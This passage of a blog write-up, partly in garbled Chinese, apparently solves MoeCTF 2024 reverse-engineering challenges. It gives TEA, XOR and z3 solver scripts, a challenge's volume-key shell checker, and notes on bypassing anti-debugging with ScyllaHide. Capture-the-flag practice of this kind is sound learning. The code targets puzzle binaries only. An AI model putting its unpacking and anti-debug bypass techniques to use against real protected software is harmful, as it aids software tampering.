class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">uint32_t</span> v[<span class="hljs-number">2</span>] = &#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;;<br>    <span class="hljs-type">uint32_t</span> delta = <span class="hljs-number">0x61C88647</span>;<br>    <span class="hljs-type">uint32_t</span> v0 = v[<span class="hljs-number">0</span>], v1 = v[<span class="hljs-number">1</span>], sum = (<span class="hljs-number">-32</span>)*delta, i; <span class="hljs-comment">/* set up */</span><br>    <span class="hljs-type">uint32_t</span> v5[<span class="hljs-number">10</span>] = &#123;<span class="hljs-number">0x5e87ff17</span>,<span class="hljs-number">0x9a831a78</span>,<span class="hljs-number">0x56c8707a</span>,<span class="hljs-number">0xc52f51</span>,<span class="hljs-number">0x8bc7393</span>,<span class="hljs-number">0xc7c31e09</span>,<span class="hljs-number">0xb1efa477</span>,<span class="hljs-number">0xddcf1d26</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> k[<span class="hljs-number">4</span>] = &#123;<span class="hljs-number">0x6C6C6568</span>, <span class="hljs-number">0x6F6D5F6F</span>, <span class="hljs-number">0x66746365</span>, <span class="hljs-number">0x34323032</span>&#125;, l = <span class="hljs-number">0</span>, r = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">uint32_t</span> k0 = k[<span class="hljs-number">0</span>], k1 = k[<span class="hljs-number">1</span>], k2 = k[<span class="hljs-number">2</span>], k3 = k[<span class="hljs-number">3</span>];<br>    <span class="hljs-comment">// vä¸ºè¦åŠ å¯†çš„æ•°æ®æ˜¯ä¸¤ä¸ª32ä½æ— ç¬¦å·æ•´æ•°</span><br>    <span class="hljs-comment">// kä¸ºåŠ å¯†è§£å¯†å¯†é’¥ï¼Œä¸º4ä¸ª32ä½æ— ç¬¦å·æ•´æ•°ï¼Œå³å¯†é’¥é•¿åº¦ä¸º128ä½</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt; <span class="hljs-number">8</span>; m += <span class="hljs-number">2</span>) &#123;<span class="hljs-comment">//flagä¸å…¨çš„è¯æœ‰å¯èƒ½æ˜¯10</span><br>    sum = (<span class="hljs-number">-32</span>)*delta;<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i++) &#123;                     <span class="hljs-comment">/* basic cycle start */</span><br>            v5[m + <span class="hljs-number">1</span>] -= ((v5[m] &lt;&lt; <span class="hljs-number">4</span>) + k2) ^ (v5[m] + sum) ^ ((v5[m] &gt;&gt; <span class="hljs-number">5</span>) + k3);<br>            v5[m] -= ((v5[m + <span class="hljs-number">1</span>] &lt;&lt; <span class="hljs-number">4</span>) + k0) ^ (v5[m + <span class="hljs-number">1</span>] + sum) ^ ((v5[m + <span class="hljs-number">1</span>] &gt;&gt; <span class="hljs-number">5</span>) + k1);<br>            sum += delta;<br>        &#125;                                              <span class="hljs-comment">/* end cycle */</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> m = <span class="hljs-number">0</span>; m &lt;= <span class="hljs-number">3</span>; m++) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x&quot;</span>, (v5[i] &gt;&gt; (<span class="hljs-number">8</span> * m)) &amp; <span class="hljs-number">0xff</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>a=[<span class="hljs-number">0x68</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x63</span>,<br>  <span class="hljs-number">0x74</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x34</span>]<br>enc=[<span class="hljs-number">0x3C</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x3C</span>,<br>  <span class="hljs-number">0x12</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x33</span>,<br>  <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x04</span>,<br>  <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x5A</span>]<br>a1=[<span class="hljs-number">0x2B</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x4C</span>,<br>  <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x3B</span>,<br>  <span class="hljs-number">0x16</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x19</span>,<br>  <span class="hljs-number">0x94</span>, <span class="hljs-number">0x87</span>]<br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    enc[i]^=a1[i]<br>    <span class="hljs-meta">#print(hex(enc[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>a2=[<span class="hljs-number">0x17</span>,<span class="hljs-number">0xff</span>,<span class="hljs-number">0x87</span>,<span class="hljs-number">0x5e</span>,<span class="hljs-number">0x78</span>,<span class="hljs-number">0x1a</span>,<span class="hljs-number">0x83</span>,<span class="hljs-number">0x9a</span>,<span class="hljs-number">0x7a</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0xc8</span>,<span class="hljs-number">0x56</span>,<span class="hljs-number">0x51</span>,<span class="hljs-number">0x2f</span>,<span class="hljs-number">0xc5</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x93</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0xbc</span>,<span class="hljs-number">0x8</span>,<span class="hljs-number">0x9</span>,<span class="hljs-number">0x1e</span>,<span class="hljs-number">0xc3</span>,<span class="hljs-number">0xc7</span>,<span class="hljs-number">0x77</span>,<span class="hljs-number">0xa4</span>,<span class="hljs-number">0xef</span>,<span class="hljs-number">0xb1</span>,<span class="hljs-number">0x26</span>,<span class="hljs-number">0x1d</span>,<span class="hljs-number">0xcf</span>,<span class="hljs-number">0xdd</span>]<br><br>def byte2uint32(d):<br>    l = []<br>    <span class="hljs-keyword">for</span> i in range(len(d) <span class="hljs-comment">// 4):</span><br>        tmp = d[i * <span class="hljs-number">4</span>:i * <span class="hljs-number">4</span> + <span class="hljs-number">4</span>]<br>        l.append(tmp[<span class="hljs-number">3</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">3</span> + tmp[<span class="hljs-number">2</span>] * <span class="hljs-number">256</span> ** <span class="hljs-number">2</span> + tmp[<span class="hljs-number">1</span>] * <span class="hljs-number">256</span> + tmp[<span class="hljs-number">0</span>])<br>    <span class="hljs-keyword">return</span> l<br><br># enc_uint32 = byte2uint32(a2)<br><span class="hljs-meta"># print(<span class="hljs-string">&quot;\n&quot;</span>)</span><br><span class="hljs-meta"># for i in range(len(enc_uint32)):</span><br><span class="hljs-meta">#     print(hex(enc_uint32[i]),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br><br>s1=<span class="hljs-string">&quot;050a090f1b3916070a142b075c6f57551b1c33061a310630040d103946555349&quot;</span><br><span class="hljs-meta"># print(len(s1))</span><br><span class="hljs-keyword">for</span> i in range(<span class="hljs-number">32</span>):<br>    <span class="hljs-meta">#print(int(s1[2*i:2*(i+1)],16))</span><br>    <span class="hljs-meta">#print((((int(s1[2*i:2*(i+1)],16)^a[i%16])+256)%256),end=<span class="hljs-string">&quot;,&quot;</span>)</span><br>    print(chr((((<span class="hljs-type">int</span>(s1[<span class="hljs-number">2</span> * i:<span class="hljs-number">2</span> * (i + <span class="hljs-number">1</span>)], <span class="hljs-number">16</span>) ^ a[i % <span class="hljs-number">16</span>]) + <span class="hljs-number">256</span>) % <span class="hljs-number">256</span>)), end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><h2 id="Secret-Module"><a href="#Secret-Module" class="headerlink" title="Secret_Module"></a>Secret_Module</h2><p>shæ–‡ä»¶base64+è§£å‹ç¼©å¾—åˆ°php</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723275505793-96bed9fe-45c9-4f68-83fb-4695676721f3.png" class="" title="img"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">testk</span>() &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Welcome to the Secret module!But before you begin,you need to prove your self.&quot;</span><br>  (/system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events) || <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;   <br><br><span class="hljs-title function_ invoke__">choose</span>() &#123;<br>  <span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span><br>  /system/bin/getevent -lc <span class="hljs-number">1</span> <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | /system/bin/grep VOLUME | /system/bin/grep <span class="hljs-string">&quot; DOWN&quot;</span> &gt; <span class="hljs-variable">$MODPATH</span>/events<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span> | /system/bin/grep VOLUME &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">break</span><br>  fi<br>  done<br>  <span class="hljs-keyword">if</span> (`cat <span class="hljs-variable">$MODPATH</span>/events <span class="hljs-number">2</span>&gt;/dev/<span class="hljs-literal">null</span> | /system/bin/grep VOLUMEUP &gt;/dev/<span class="hljs-literal">null</span>`); then<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;114514&quot;</span><br>  <span class="hljs-keyword">else</span><br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1919810&quot;</span><br>  fi<br>  &#125;<br><br>  <span class="hljs-keyword">if</span> testk; then<br>  ui_print <span class="hljs-string">&quot;Great! Now enter the secret.&quot;</span><br><br>  <span class="hljs-keyword">else</span><br>  ui_print <span class="hljs-string">&quot;Legacy Device. Use a newer device to do this challenge&quot;</span><br>  <span class="hljs-keyword">exit</span><br>  fi<br><br>  concatenated=<span class="hljs-string">&quot;&quot;</span><br><br>  <span class="hljs-keyword">for</span> i in <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span><br>    <span class="hljs-keyword">do</span><br>      result=$(choose)<br>        concatenated=<span class="hljs-string">&quot;$&#123;concatenated&#125;$&#123;result&#125;&quot;</span><br>        done<br><br>          input_str=$(<span class="hljs-keyword">echo</span> -n <span class="hljs-variable">$concatenated</span> | md5sum | awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span>)<br>          sec=<span class="hljs-string">&quot;77a58d62b2c0870132bfe8e8ea3ad7f1&quot;</span><br>          <span class="hljs-keyword">if</span> test <span class="hljs-variable">$input_str</span> = <span class="hljs-variable">$sec</span><br>            then<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;You are right!Flag is&#x27;</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;moectf<span class="hljs-subst">&#123;$concatenated&#125;</span>&quot;</span><br>            <span class="hljs-keyword">else</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Wrong. Try again.&#x27;</span><br>            <span class="hljs-keyword">exit</span><br>            fi<br></code></pre></td></tr></table></figure><h2 id="Cython-Strike"><a href="#Cython-Strike" class="headerlink" title="Cython_Strike"></a>Cython_Strike</h2><p>å¾—åˆ°whlï¼Œçœ‹æ ¼å¼æ˜¯zipï¼Œè§£å‹å¾—åˆ°pyd</p><p>æœ‰ä¸€äº›æ‰“å°å‡ºæ¥çš„æè¿°å’Œå¾ˆåƒflagçš„å­—ç¬¦ä¸²ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•åŠ å¯†äº†</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794082239-1f5187f0-1d2c-4d59-b427-1cc80757b37e.png" class="" title="img"><p>å…ˆç”¨python3.12å¯¼å…¥ï¼Œhelpä¹‹åçœ‹æ–¹æ³•ï¼Œmaskåˆšå¥½æ˜¯è¿è¡Œè·å¾—çš„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794067248-dfc751dc-3e6c-4f15-a2b0-6f79c39cad3e.png" class="" title="img"><p>éœ€è¦çŸ¥é“è¾“å…¥çš„å¯†ç ï¼Œä¸¤ä¸ªæ–¹ç¨‹ç®—å‡ºæ¥çš„inputä¸ä¸€æ ·ï¼Œéƒ½å»è¯•ä¸€ä¸‹å‘ç°ç¬¬äºŒä¸ªæ˜¯å¯¹çš„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794193586-b9dcc0cd-276e-44d1-94bb-83d9113bfad1.png" class="" title="img"><p>åé¢å‘ç°&#x3D;&#x3D;ä¼˜å…ˆçº§é«˜äº^ï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ä¸€ä¸ªæ–¹ç¨‹æ²¡ç”¨ï¼ŒåŒæ—¶çœŸæ­£çš„flagå’Œä¸Šé¢çš„å­—ç¬¦ä¸²é•¿åº¦ä¸€æ ·ï¼Œä½†ä¸çŸ¥é“å¦‚ä½•ä»£æ¢çš„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794288624-396fbbc5-8493-48cc-840e-498c2fd2bf3c.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723795016076-4fcc7ef5-fe44-4887-9f60-7d7b3beca049.png" class="" title="img"><p>å‘ç°å’Œidaæ˜¾ç¤ºçš„ä¸€æ‘¸ä¸€æ ·</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723794998339-b10e992b-c73a-4ef5-9ba5-2bc5a557cda7.png" class="" title="img"><h2 id="babe-z3"><a href="#babe-z3" class="headerlink" title="babe_z3"></a>babe_z3</h2><p>é€šè¿‡æ¨ç†å¯å¾—ï¼Œv4æœ€åè¦ä¸ç­‰äº0ï¼Œè€Œ23è¡Œå¼ºåˆ¶ç±»å‹è½¬åŒ–ä¹‹åä¹Ÿè¦ä¸ç­‰äº0ï¼Œé‚£ä¹ˆv4|&#x3D;0x100000000ä¹‹åè¦ä¸º0x100000000ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€å¼€å§‹v4ä¸º0ï¼Œå³ç¬¬ä¸€ä¸ªè¡¨è¾¾å¼æ²¡ç”¨</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1723949889550-5afdc433-ff84-47cc-8481-3e6b65b3335a.png" class="" title="img"><p>è¿™é‡Œv6,v7,v8å…¶å®éƒ½æ˜¯sçš„ä¸€éƒ¨åˆ†ï¼Œä¹Ÿå°±æ˜¯è¯´éƒ½è¦æ‰“å°</p><p>æœ€åå¾—åˆ°çš„å­—ç¬¦ä¸²éƒ½è¦é€†åºå› ä¸ºæŒ‰å°ç«¯åºå­˜å‚¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> n2s<br><span class="hljs-keyword">from</span> z3 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># å®šä¹‰å˜é‡</span><br>s = BitVec(<span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-number">64</span>)<br>v6 = BitVec(<span class="hljs-string">&#x27;v6&#x27;</span>, <span class="hljs-number">64</span>)<br>v7 = BitVec(<span class="hljs-string">&#x27;v7&#x27;</span>, <span class="hljs-number">64</span>)<br>v8 = BitVec(<span class="hljs-string">&#x27;v8&#x27;</span>, <span class="hljs-number">64</span>)<br>v4 = BitVec(<span class="hljs-string">&#x27;v4&#x27;</span>, <span class="hljs-number">64</span>)<br>solver = Solver()<br><br>solver.add((v7 &amp; s &amp; v8 | (~(v6 | s) | v6 &amp; v7) &amp; v6 &amp; s) == <span class="hljs-number">0x2024243035302131</span>)<br>solver.add((v6 ^ (v7 &amp; (s + v7) | v8 &amp; ~(v7 &amp; s) | v6 &amp; (v6 + v8) &amp; ~s)) == <span class="hljs-number">0x7071001344417B54</span>)<br>solver.add(((v7 - v8) ^ (s - v6)) == <span class="hljs-number">0x3FE01013130FFD3</span>)<br>solver.add((s + v7 - v8 + v6) * (v8 + s + v6 - v7) == <span class="hljs-number">0x1989A41A9049C5C9</span>)<br>solver.add((v7 + v6 + s + v8) % <span class="hljs-number">0x1BF52</span> == <span class="hljs-number">21761</span>)<br>solver.add(v8 * v7 * v6 * s % <span class="hljs-number">0x1D4B42</span> == <span class="hljs-number">827118</span>)<br><br><span class="hljs-keyword">if</span> solver.check() == sat:<br>    model = solver.model()<br>    <span class="hljs-built_in">print</span>(model[s].as_long(),end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(model[s].as_long(), end=<span class="hljs-string">&quot; &quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[s].as_long()),end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v6].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v7].as_long()), end=<span class="hljs-string">&quot;&quot;</span>)<br>    <span class="hljs-built_in">print</span>(n2s(model[v8].as_long()))<br><br>s=<span class="hljs-string">&#x27;cd5250c9dbc4fdab1760517947e35495&#x27;</span><br>a=<span class="hljs-string">&#x27;&#x27;</span><br>s1=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">32</span>,<span class="hljs-number">8</span>):<br>    a=s[i:i+<span class="hljs-number">8</span>]<br>    a=a[::-<span class="hljs-number">1</span>]<br>    s1+=a<br><span class="hljs-comment">#print(s1)</span><br></code></pre></td></tr></table></figure><h2 id="BlackHole-2"><a href="#BlackHole-2" class="headerlink" title="BlackHole-2"></a>BlackHole-2</h2><p>dllæœ‰vmpå£³</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724832562212-3d248860-6178-4047-8cfe-10c27dbb9dce.png" class="" title="img"><h2 id="moeprotector"><a href="#moeprotector" class="headerlink" title="moeprotector"></a>moeprotector</h2><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161326570-4e6be3d3-524d-4567-b464-38a877d1fdec.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724161138144-4d81b94a-08f2-402b-8459-b715d00b61b9.png" class="" title="img"><p>é™æ€åˆ†æåˆ°è¿™é‡Œï¼Œå‘ç°æ¯”è¾ƒå¤æ‚ï¼Œéœ€è¦ç»“åˆåŠ¨è°ƒ</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724162238375-c925b571-bba9-4c15-9c36-201c917c1dcf.png" class="" title="img"><p>è¾“å…¥0èƒ½è§¦å‘ç¬¬ä¸€æ¬¡å¼‚å¸¸</p><p>è¾“å…¥é•¿åº¦ç¬¦åˆè§¦å‘ç¬¬äºŒæ¬¡å¼‚å¸¸</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724310928181-2c3ef0d4-bbf6-4b1b-8366-b0b98806b806.png" class="" title="img"><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">moectf</span><span class="hljs-template-variable">&#123;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#125;</span><br></code></pre></td></tr></table></figure><p>åˆ°è¿™é‡Œæœ‰åè°ƒè¯•ï¼Œéœ€è¦ç”¨ScyllaHideæ’ä»¶ååè°ƒè¯•</p><p><a href="https://github.com/x64dbg/ScyllaHide/releases/tag/v1.4">Release v1.4 Â· x64dbg&#x2F;ScyllaHide (github.com)</a></p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724312564780-41636bf7-54b3-40eb-b12d-83adb5bb5d7a.png" class="" title="img"><p>åŠ¨æ€è°ƒè¯•å‘ç°8ä¸ªå¯†æ–‡ä¸€ç»„</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380176738-e0b153c0-d43f-4c63-aa95-49391ee58424.png" class="" title="img"><p>å¯¹æœ€åä¸€ä½è¿›è¡Œå¤„ç†ï¼Œæ€»å…±ä¸‰æ¬¡å¾ªç¯ï¼ŒåŸºæœ¬é€»è¾‘å·®ä¸å¤š</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380241829-f415a6cc-ebba-4b08-b123-43ae15ce2f20.png" class="" title="img"><p>æ­£å¸¸åˆ†æå¤§æ¦‚æ˜¯è¿™æ ·ï¼Œä½†æ˜¯é€†ä¸æ˜ç™½</p><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380762344-07d413bc-89e7-42e2-87b4-6d9a14bf68b6.png" class="" title="img"><img src="/2024/10/12/MoeCTF2024%E9%83%A8%E5%88%86Re%E4%B8%8EPwn/1724380290986-a3acea4f-9120-4f07-aa42-a25c0ed30f01.png" class="" title="img"><p>æœ‰ä¸ªæ€è·¯æ˜¯57ä½æ˜æ–‡ï¼Œ8ä¸ªä¸€ç»„ï¼Œé‚£ä¹ˆæœ€åä¸€ä½å¤šä½™äº†ï¼Œä½†æ˜¯ä¸€èˆ¬çš„ç®—æ³•è¦ä¹ˆç›´æ¥æ˜¯8çš„æ•´æ•°å€ï¼Œè¦ä¹ˆå¡«å……åˆ°8çš„æ•´æ•°å€ï¼Œè¿™é‡Œæ²¡æœ‰ï¼ŒçŒœæµ‹æ˜¯ä¸æ˜¯æ‰€æœ‰ä½å¤„ç†æ–¹å¼éƒ½æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æŒ‰æœ€åä¸€ä½çš„åŠ å¯†é€»è¾‘æ¥ï¼Œå°è¯•ä¸€ä¸‹å‘ç°çœŸçš„æ˜¯è¿™æ ·ï¼Œæ‰€ä»¥å‰é¢çš„åŠ å¯†å¯èƒ½æ˜¯åœ¨æ··æ·†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs python">a=[  <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x8D</span>,<br>   <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x4C</span>,<br>   <span class="hljs-number">0x33</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x11</span>, <span 